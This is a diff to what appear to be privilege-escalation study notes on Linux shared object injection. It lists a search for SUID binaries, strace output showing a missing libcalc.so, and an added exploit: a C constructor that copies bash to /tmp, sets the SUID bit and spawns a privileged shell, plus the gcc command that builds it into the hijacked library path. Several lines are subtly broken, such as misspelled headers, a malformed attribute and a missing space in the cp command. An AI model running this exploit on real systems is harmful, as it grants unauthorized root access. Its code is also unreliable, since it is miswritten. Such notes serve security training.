@@ -11,7 +11,7 @@
   ## Shared Object Injection
   
        find / -type f -perm -04000 -ls 2>/dev/null
-       strace <PATH=2>&1>
+       strace <PATH=2>&1
        
        
   ## TYPE COMMAND 
@@ -40,8 +40,22 @@
 ## open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
 
 
-
+   ## Exploit Shared Object Injection
    
+       mkdir /home/user/.config
+       
+       Create C file Type Some Commands
+       
+       #include <stdio.h>
+       #include <stdib.h>
+    static void inject()_attribute_((constructor));
+
+   void inject(){
+
+     system("cp/bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
+}
+
+   gcc -shared -fpic -o /home/user/.config/libcalc.so /home/user/libcalc.c
 
 
 
